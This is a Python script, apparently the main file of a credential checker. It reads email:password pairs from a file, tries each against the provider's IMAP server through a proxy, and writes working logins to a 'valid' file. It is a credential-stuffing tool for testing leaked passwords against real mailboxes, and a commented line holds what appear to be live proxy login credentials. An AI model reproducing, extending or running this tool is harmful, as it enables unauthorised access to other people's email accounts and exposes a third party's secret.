from utils.config import load_config
from utils.imap_utils import get_imap_server, validate_email

def load_email_list(input_file="data/input.txt"):
    """Loads email:password combinations from the input file.

    Args:
        input_file (str): Path to the input file.

    Returns:
        list: A list of tuples, where each tuple is (email, password).
    """

    email_list = []
    with open(input_file, "r") as f:
        for line in f:
            email, password = line.strip().split(":")
            email_list.append((email, password))
    return email_list

def write_to_file(email, filename):
    """Writes an email address to the specified file.

    Args:
        email (str): The email address to write.
        filename (str): The name of the file to write to.
    """

    with open(filename, "a") as f:
        f.write(email + "\n")

if __name__ == "__main__":
    config = load_config()
    email_list = load_email_list()
    
    # Parse the proxy string
    # config["proxy"] = "104.243.45.62:4000:datacenter--uname--arara669i7r6yn0b7ogo:l2kdxdbdx2sg"

    for email, password in email_list:
        imap_server = get_imap_server(email, config)

        if imap_server:
            is_valid = validate_email(email, password, imap_server, config)
            if is_valid:
                print(f"Email {email} is VALID!")
                write_to_file(email, "data/valid.txt")
            else:
                print(f"Email {email} is INVALID!")
                write_to_file(email, "data/bad.txt")
        else:
            print(f"Could not find IMAP server for {email}")
            write_to_file(email, "data/imapissue.txt")